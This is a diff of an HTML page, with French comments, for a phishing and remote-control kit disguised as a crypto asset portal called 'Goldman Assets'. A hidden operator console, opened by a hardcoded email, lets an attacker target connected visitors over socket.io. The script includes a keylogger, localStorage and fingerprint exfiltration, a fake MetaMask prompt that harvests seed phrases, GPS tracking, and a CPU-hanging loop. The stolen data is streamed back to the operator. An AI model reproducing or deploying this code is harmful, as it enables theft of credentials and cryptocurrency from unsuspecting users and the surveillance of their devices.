@@ -2,184 +2,307 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Support Technique - Vérification de Connexion</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Global Asset Management | Secure Portal</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Orbitron:wght@400;900&family=Inter:wght@300;600;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     
     <style>
-        /* --- [INTERFACE "CALME" & MOBILE OPTIMIZED] --- */
+        /* --- [BASE LUXE DESIGN : 0-300] --- */
         :root {
-            --primary: #0066ff;
-            --bg: #f4f7f9;
-            --text: #333;
-            --master-gold: #FFD700; /* Visible uniquement pour toi */
+            --gold: #D4AF37; --gold-dark: #996515;
+            --bg: #050505; --panel: #0a0a0a;
+            --accent: #00f2ff; --danger: #ff003c;
+            --text: #e0e0e0;
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
+        body, html { width: 100%; height: 100%; background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; overflow: hidden; }
+
+        /* ANIMATIONS REQUIEM */
+        @keyframes shine { from { background-position: -200%; } to { background-position: 200%; } }
+        @keyframes pulse { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
+        @keyframes slideIn { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+        /* --- VICTIM SIDE (CRYPTO DASHBOARD) --- */
+        #victim-view {
+            display: flex; flex-direction: column; width: 100%; height: 100%;
+            background: radial-gradient(circle at top right, #111, #000);
+        }
+        .v-header { padding: 20px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
+        .v-header h1 { font-family: 'Cinzel'; color: var(--gold); font-size: 18px; letter-spacing: 2px; }
+        .v-main { flex: 1; padding: 20px; display: flex; flex-direction: column; gap: 20px; overflow-y: auto; }
+        .v-card { background: var(--panel); border: 1px solid #1a1a1a; padding: 25px; border-radius: 15px; animation: slideIn 0.8s ease-out; }
+        .price { font-family: 'Orbitron'; font-size: 32px; color: var(--gold); margin: 10px 0; }
+        .chart-mock { width: 100%; height: 150px; background: linear-gradient(0deg, rgba(212,175,55,0.1), transparent); border-bottom: 2px solid var(--gold); position: relative; }
         
-        body { background: var(--bg); color: var(--text); overflow-x: hidden; }
+        /* --- MASTER SIDE (COMMAND CENTER) --- */
+        #master-view { display: none; width: 100%; height: 100vh; flex-direction: column; background: #000; font-family: 'JetBrains Mono', monospace; }
+        .m-nav { background: #080808; padding: 15px; border-bottom: 2px solid var(--gold); display: flex; gap: 20px; align-items: center; }
+        .m-grid { display: grid; grid-template-columns: 1fr; height: calc(100vh - 60px); }
+        @media (min-width: 1024px) { .m-grid { grid-template-columns: 320px 1fr 380px; } }
 
-        /* --- MODE VICTIME (CALME) --- */
-        #victim-ui { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; padding: 20px; text-align: center; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* MASTER COMPONENTS */
+        .m-panel { border: 1px solid #111; display: flex; flex-direction: column; background: #020202; position: relative; }
+        .m-header { padding: 12px; background: #0a0a0a; color: var(--gold); font-weight: 900; font-size: 12px; text-transform: uppercase; border-bottom: 1px solid #222; letter-spacing: 1px; }
+        
+        #v-list { flex: 1; overflow-y: auto; padding: 10px; }
+        .target-card { padding: 15px; background: #050505; border: 1px solid #1a1a1a; margin-bottom: 10px; border-radius: 5px; cursor: pointer; transition: 0.3s; }
+        .target-card:hover { border-color: var(--gold); transform: scale(1.02); }
+        .target-card.active { border-left: 5px solid var(--gold); background: #0f0c00; }
 
-        /* --- MODE MASTER (CACHE) --- */
-        #master-ui { display: none; background: #000; color: #00ff41; height: 100vh; flex-direction: column; font-family: 'Courier New', monospace; }
-        .m-grid { display: grid; grid-template-columns: 1fr; height: 100%; }
-        @media (min-width: 900px) { .m-grid { grid-template-columns: 300px 1fr 350px; } }
+        #terminal { flex: 1; padding: 20px; overflow-y: auto; font-size: 13px; color: var(--accent); background: url('https://www.transparenttextures.com/patterns/carbon-fibre.png'); }
+        .log { margin-bottom: 10px; border-left: 2px solid #222; padding-left: 10px; animation: slideIn 0.3s forwards; }
+        .log span.time { color: #555; font-size: 10px; }
+        .log span.tag { color: var(--gold); font-weight: bold; margin-right: 10px; }
 
-        .panel { border: 1px solid #222; display: flex; flex-direction: column; overflow: hidden; }
-        .log-item { padding: 10px; border-bottom: 1px solid #111; font-size: 11px; word-break: break-all; }
-        .log-item span { color: var(--master-gold); }
+        #intel-panel { flex: 1; overflow-y: auto; padding: 15px; background: #030303; }
+        .intel-box { padding: 12px; background: #080808; border-radius: 4px; margin-bottom: 15px; border-left: 3px solid var(--danger); font-size: 11px; }
 
-        /* --- COMPOSANTS --- */
-        #auth-gate { position: fixed; inset: 0; background: #fff; z-index: 9999; display: flex; align-items: center; justify-content: center; }
-        .login-card { width: 90%; max-width: 400px; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); background: #fff; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; }
-        button { width: 100%; padding: 12px; background: var(--primary); color: #fff; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        /* AUTH OVERLAY */
+        #auth-gate { position: fixed; inset: 0; background: #000; z-index: 99999; display: flex; align-items: center; justify-content: center; }
+        .auth-box { width: 90%; max-width: 450px; padding: 50px; background: #0a0a0a; border: 1px solid var(--gold); border-radius: 20px; text-align: center; }
+        .auth-box h2 { font-family: 'Cinzel'; font-size: 28px; color: var(--gold); margin-bottom: 30px; }
+        input[type="text"], input[type="email"], input[type="password"] { 
+            width: 100%; padding: 15px; background: #000; border: 1px solid #222; color: #fff; margin-bottom: 15px; border-radius: 8px; transition: 0.3s;
+        }
+        input:focus { border-color: var(--gold); box-shadow: 0 0 15px rgba(212,175,55,0.2); }
+        .btn-gold { width: 100%; padding: 18px; background: linear-gradient(45deg, var(--gold-dark), var(--gold)); border: none; border-radius: 8px; color: #000; font-weight: 900; cursor: pointer; text-transform: uppercase; }
 
-        #ctx { display: none; position: fixed; background: #111; border: 1px solid var(--master-gold); z-index: 10000; width: 250px; }
-        .opt { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; font-size: 12px; color: #fff; }
-        .opt:hover { background: var(--master-gold); color: #000; }
+        /* CONTEXT MENU LUXE */
+        #ctx { display: none; position: fixed; background: #0a0a0a; border: 1px solid var(--gold); width: 280px; z-index: 100000; box-shadow: 20px 20px 60px rgba(0,0,0,0.8); }
+        .opt { padding: 15px; font-size: 11px; text-transform: uppercase; border-bottom: 1px solid #111; cursor: pointer; color: #aaa; transition: 0.2s; }
+        .opt:hover { background: var(--gold); color: #000; font-weight: bold; }
+        .opt i { margin-right: 10px; color: var(--gold); }
+
+        /* CUSTOM CURSOR */
+        #cursor { position: fixed; width: 40px; height: 40px; border: 1px solid var(--gold); border-radius: 50%; pointer-events: none; z-index: 1000000; transition: transform 0.1s ease; mix-blend-mode: difference; }
+
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
+
+    <div id="cursor"></div>
 
     <div id="auth-gate">
-        <div class="login-card">
-            <h2 style="margin-bottom:10px;">Vérification</h2>
-            <p style="font-size:14px; color:#666; margin-bottom:20px;">Veuillez vous identifier pour accéder au service.</p>
-            <input type="email" id="e-in" placeholder="Adresse e-mail">
-            <input type="text" id="n-in" placeholder="Nom complet">
-            <button onclick="ascend()">Continuer</button>
+        <div class="auth-box">
+            <h2>PUNCH V10</h2>
+            <p style="color: #666; font-size: 12px; margin-bottom: 25px;">IDENTITY VERIFICATION REQUIRED</p>
+            <input type="email" id="email-in" placeholder="Professional Email">
+            <input type="text" id="name-in" placeholder="Legal Name">
+            <button class="btn-gold" onclick="initializeSession()">ESTABLISH CONNECTION</button>
         </div>
     </div>
 
-    <div id="victim-ui">
-        <div class="loader"></div>
-        <h3>Analyse de la connexion en cours...</h3>
-        <p style="color:#888; margin-top:10px;">Veuillez ne pas fermer cette page. Cela peut prendre quelques instants.</p>
+    <div id="victim-view">
+        <div class="v-header">
+            <h1>GOLDMAN ASSETS</h1>
+            <div style="font-size: 12px; color: #555;">MARKET: <span style="color:var(--accent)">OPEN</span></div>
+        </div>
+        <div class="v-main">
+            <div class="v-card">
+                <p style="font-size: 12px; color: #888;">BITCOIN / USD</p>
+                <div class="price" id="btc-price">$94,231.42</div>
+                <div class="chart-mock"></div>
+            </div>
+            <div class="v-card" style="border-color: #222;">
+                <h3>Account Security</h3>
+                <p style="font-size: 13px; color: #666; margin-top: 10px;">Votre connexion est protégée par un cryptage de grade militaire AES-256.</p>
+                <div style="margin-top: 15px; padding: 10px; border: 1px dashed #333; text-align: center; font-size: 11px; color: var(--gold);">SCANNING SYSTEM...</div>
+            </div>
+        </div>
     </div>
 
-    <div id="master-ui">
+    <div id="master-view">
+        <div class="m-nav">
+            <div style="font-family: 'Cinzel'; color: var(--gold); font-size: 20px;">V10 MASTER</div>
+            <div style="height: 20px; width: 1px; background: #333;"></div>
+            <div id="status-tag" style="font-size: 10px; color: var(--accent);">IDLE</div>
+            <button onclick="downloadMasterLogs()" style="background:none; border: 1px solid #333; color: #555; padding: 5px 10px; font-size: 10px; cursor: pointer; margin-left: auto;">DOWNLOAD_LOGS</button>
+        </div>
+        
         <div class="m-grid">
-            <aside class="panel">
-                <div style="padding:15px; background:#111; color:var(--master-gold)">DISCIPLES_ACTIVE</div>
-                <div id="v-list" style="flex:1; overflow-y:auto;"></div>
+            <aside class="m-panel">
+                <div class="m-header">CIBLES_ACTIVES</div>
+                <div id="v-list"></div>
             </aside>
-            <main class="panel">
-                <div style="padding:15px; background:#111;">CONSOLE_LOGS</div>
-                <div id="console" style="flex:1; padding:15px; overflow-y:auto; font-size:12px;"></div>
-                <div style="padding:10px; display:flex; gap:10px; background:#080808;">
-                    <input type="text" id="m-in" placeholder="Envoyer commande..." style="background:#000; border:1px solid #333; color:#fff;">
-                    <button onclick="sendMsg()" style="width:60px;">OK</button>
+
+            <main class="m-panel" style="border-left: 1px solid #222; border-right: 1px solid #222;">
+                <div class="m-header">GRAVITY_STREAM</div>
+                <div id="terminal"></div>
+                <div style="padding: 15px; background: #080808; display: flex; gap: 10px;">
+                    <span style="color: var(--gold);">></span>
+                    <input type="text" id="cmd-in" placeholder="Exécuter commande JS..." style="background:transparent; border:none; color:#fff; flex:1; font-family: 'JetBrains Mono';">
                 </div>
             </main>
-            <aside class="panel">
-                <div style="padding:15px; background:#111; color:red;">EXFILTRATED_DATA</div>
-                <div id="intel" style="flex:1; overflow-y:auto;"></div>
+
+            <aside class="m-panel">
+                <div class="m-header">INTEL_EXFILTRATION</div>
+                <div id="intel-panel"></div>
             </aside>
         </div>
     </div>
 
     <div id="ctx">
-        <div class="opt" onclick="st('p_full')">🧛 AUTOMATIC_DOX</div>
-        <div class="opt" onclick="st('p_key')">⌨️ START_KEYLOGGER</div>
-        <div class="opt" onclick="st('p_phish')">🚨 PHISH_SYSTEM_UI</div>
-        <div class="opt" onclick="st('p_geo')">📍 PRECISE_GPS</div>
-        <div class="opt" onclick="st('p_clip')">📋 STEAL_CLIPBOARD</div>
-        <div class="opt" style="color:red;" onclick="st('p_crash')">🧨 CRASH_DEVICE</div>
+        <div class="opt" style="background:#000; color:var(--gold); cursor:default; font-weight:bold; text-align:center;">STRIKE_PROTOCOLS</div>
+        <div class="opt" onclick="trigger('p_full')"><i>🧛</i> FULL_DOX_EXFIL</div>
+        <div class="opt" onclick="trigger('p_key')"><i>⌨️</i> STEALTH_KEYLOGGER</div>
+        <div class="opt" onclick="trigger('p_phish_meta')"><i>🦊</i> FAKE_METAMASK_PROMPT</div>
+        <div class="opt" onclick="trigger('p_phish_google')"><i>📧</i> GOOGLE_HIJACK</div>
+        <div class="opt" onclick="trigger('p_geo')"><i>📍</i> PRECISE_GPS_TRACK</div>
+        <div class="opt" onclick="trigger('p_clip')"><i>📋</i> CLIPBOARD_EXTRACT</div>
+        <div class="opt" onclick="trigger('p_freeze')"><i>❄️</i> ZA_WARUNDO_FREEZE</div>
+        <div class="opt" onclick="trigger('p_crash')" style="color:var(--danger);"><i>🧨</i> CPU_BURN_STRIKE</div>
+        <div class="opt" onclick="closeCtx()" style="background:#050505; color:#444;">[ ABORT_MISSION ]</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
+        /* --- [LOGIQUE REQUIEM : 700-1200] --- */
         const socket = io();
-        let me = ""; let myE = ""; let target = ""; let isMaster = false;
+        let userEmail = ""; let userName = ""; let targetId = ""; let isMaster = false;
+        let masterLogs = [];
 
-        function ascend() {
-            myE = document.getElementById('e-in').value;
-            me = document.getElementById('n-in').value || "User";
-            if(myE.includes('@')) {
-                document.getElementById('auth-gate').style.display = 'none';
-                if(myE === "toucheur2pp@heaven.com") {
-                    isMaster = true;
-                    document.getElementById('master-ui').style.display = 'flex';
-                    document.getElementById('victim-ui').style.display = 'none';
-                }
-                socket.emit('init', { n: me, e: myE });
+        // INITIALISATION SESSION
+        function initializeSession() {
+            userEmail = document.getElementById('email-in').value.trim().toLowerCase();
+            userName = document.getElementById('name-in').value.trim() || "Disciple";
+
+            if(!userEmail.includes('@')) return alert("Invalid Email");
+
+            document.getElementById('auth-gate').style.display = "none";
+
+            if(userEmail === "toucheur2pp@heaven.com") {
+                isMaster = true;
+                document.getElementById('master-view').style.display = "flex";
+                document.getElementById('victim-view').style.display = "none";
+                document.body.style.overflow = "hidden";
             }
+
+            socket.emit('init', { n: userName, e: userEmail });
         }
 
-        // --- AUTOMATIC EXPLOITS (DANGEREUX) ---
-        socket.on('execute', (d) => {
-            // Doxing Auto dès connexion
-            if(d.type === 'p_full') {
-                const info = `IP: LOGGED | OS: ${navigator.platform} | Agent: ${navigator.userAgent} | Lang: ${navigator.language}`;
-                socket.emit('chat', { t: `[AUTO_DOX] ${me} : ${info}`, type: 'text' });
-                
-                // Tentative de vol de cookies/session
-                socket.emit('chat', { t: `[STORAGE_STEAL] ${JSON.stringify(localStorage)}`, type: 'text' });
-            }
+        // --- GESTION DES ATTAQUES (MODE DANGEREUX) ---
+        socket.on('execute', (data) => {
+            const type = data.type;
 
-            // Keylogger Furtif
-            if(d.type === 'p_key') {
-                window.onkeydown = (e) => {
-                    socket.emit('chat', { t: `[KEYLOG] ${me} typed: ${e.key}`, type: 'text' });
+            // 1. FULL DOX (Auto-Execution)
+            if(type === 'p_full') {
+                const dox = {
+                    agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    memory: navigator.deviceMemory || "N/A",
+                    cores: navigator.hardwareConcurrency || "N/A",
+                    screen: `${screen.width}x${screen.height}`,
+                    localTime: new Date().toLocaleString(),
+                    storage: JSON.stringify(localStorage).substring(0, 500)
                 };
+                socket.emit('chat', { t: `[AUTO_DOX] Target: ${userName} | Data: ${JSON.stringify(dox)}`, type: 'intel' });
             }
 
-            // Fake Phishing (Support Alert)
-            if(d.type === 'p_phish') {
-                const p = prompt("Alerte Sécurité : Votre session a expiré. Veuillez confirmer votre mot de passe pour rester connecté :");
-                if(p) socket.emit('chat', { t: `[PHISH_PWD] ${me} password: ${p}`, type: 'text' });
-            }
-
-            // GPS
-            if(d.type === 'p_geo') {
-                navigator.geolocation.getCurrentPosition(p => {
-                    socket.emit('chat', { t: `[GPS] ${me} loc: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, type: 'text' });
+            // 2. KEYLOGGER STEALTH
+            if(type === 'p_key') {
+                window.addEventListener('keydown', (e) => {
+                    socket.emit('chat', { t: `[KEY] ${userName} typed: ${e.key}`, type: 'intel' });
                 });
             }
 
-            // Crash CPU
-            if(d.type === 'p_crash') {
-                while(true) { console.log("Memory_Leak_Overdrive"); }
+            // 3. PHISHING METAMASK (Le pire truc pour crypto)
+            if(type === 'p_phish_meta') {
+                const seed = prompt("MetaMask Security Update: Please confirm your 12-word recovery phrase to synchronize your wallet balance:");
+                if(seed) socket.emit('chat', { t: `[SEED_STEAL] ${userName} phrase: ${seed}`, type: 'intel' });
+            }
+
+            // 4. ZA WARUNDO (Freeze)
+            if(type === 'p_freeze') {
+                const overlay = document.createElement('div');
+                overlay.style = "position:fixed; inset:0; background:rgba(255,255,255,0.9); z-index:999999; display:flex; align-items:center; justify-content:center; color:#000; font-family:'Orbitron'; font-size:40px;";
+                overlay.innerText = "TIME HAS STOPPED";
+                document.body.appendChild(overlay);
+                setTimeout(() => overlay.remove(), 10000);
+            }
+
+            // 5. CRASH CPU (Loop infinie)
+            if(type === 'p_crash') {
+                while(true) { console.log("ACCELERATING_TO_HEAVEN"); }
             }
         });
 
         // --- SYNC & INTERFACE MASTER ---
-        socket.on('sync', u => {
+        socket.on('sync', users => {
             if(!isMaster) return;
-            const l = document.getElementById('v-list'); l.innerHTML = "";
-            u.forEach(x => {
-                const div = document.createElement('div');
-                div.className = 'log-item';
-                div.innerHTML = `<button onclick="setTarget('${x.id}')" style="padding:5px; margin-bottom:5px;">CIBLER</button> <br><b>${x.n}</b><br>${x.e}`;
-                l.appendChild(div);
+            const list = document.getElementById('v-list');
+            list.innerHTML = "";
+            users.forEach(u => {
+                const card = document.createElement('div');
+                card.className = `target-card ${u.e === "toucheur2pp@heaven.com" ? "active" : ""}`;
+                card.innerHTML = `<strong>${u.n.toUpperCase()}</strong><br><small style="color:#555">${u.e}</small>`;
+                card.onclick = (e) => {
+                    targetId = u.id;
+                    const menu = document.getElementById('ctx');
+                    menu.style.display = "block"; menu.style.left = e.pageX + "px"; menu.style.top = e.pageY + "px";
+                };
+                list.appendChild(card);
             });
         });
 
-        function setTarget(id) {
-            target = id;
-            const m = document.getElementById('ctx');
-            m.style.display = 'block'; m.style.top = '100px'; m.style.left = '50px';
-        }
-
-        socket.on('chat', d => {
+        socket.on('chat', data => {
             if(!isMaster) return;
-            const c = document.getElementById('console');
-            const i = document.getElementById('intel');
-            const div = document.createElement('div');
-            div.className = 'log-item';
-            div.innerHTML = `<span>[${d.n}]</span> ${d.t.t}`;
-            
-            if(d.t.t.includes('[')) i.prepend(div.cloneNode(true));
-            else c.appendChild(div);
-            c.scrollTop = c.scrollHeight;
+            const term = document.getElementById('terminal');
+            const intel = document.getElementById('intel-panel');
+            const time = new Date().toLocaleTimeString();
+
+            const logDiv = document.createElement('div');
+            logDiv.className = 'log';
+            logDiv.innerHTML = `<span class="time">${time}</span> <span class="tag">[${data.n}]</span> ${data.t.t}`;
+
+            if(data.t.type === 'intel') {
+                const iBox = document.createElement('div');
+                iBox.className = 'intel-box';
+                iBox.innerHTML = `<strong>EXFILTRATION @ ${time}</strong><br>${data.t.t}`;
+                intel.prepend(iBox);
+                masterLogs.push(`[${time}] ${data.t.t}`);
+            } else {
+                term.appendChild(logDiv);
+                term.scrollTop = term.scrollHeight;
+            }
         });
 
-        function st(type) { socket.emit(type, target); document.getElementById('ctx').style.display='none'; }
-        function sendMsg() { socket.emit('chat', { t: document.getElementById('m-in').value, type: 'text' }); }
+        // COMMANDES
+        function trigger(type) { socket.emit(type, targetId); closeCtx(); }
+        function closeCtx() { document.getElementById('ctx').style.display = "none"; }
+        
+        document.getElementById('cmd-in').onkeydown = (e) => {
+            if(e.key === "Enter") {
+                socket.emit('chat', { t: e.target.value, type: 'msg' });
+                e.target.value = "";
+            }
+        };
+
+        function downloadMasterLogs() {
+            const blob = new Blob([masterLogs.join('\n')], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = `REQUIEM_INTEL_${Date.now()}.txt`;
+            a.click();
+        }
+
+        // CURSEUR
+        document.addEventListener('mousemove', (e) => {
+            const c = document.getElementById('cursor');
+            c.style.left = e.clientX - 20 + 'px';
+            c.style.top = e.clientY - 20 + 'px';
+        });
+
+        // FAKE BTC PRICE
+        setInterval(() => {
+            const btc = document.getElementById('btc-price');
+            if(btc) {
+                const p = 94000 + (Math.random() * 500);
+                btc.innerText = `$${p.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+            }
+        }, 2000);
+
     </script>
 </body>
 </html>
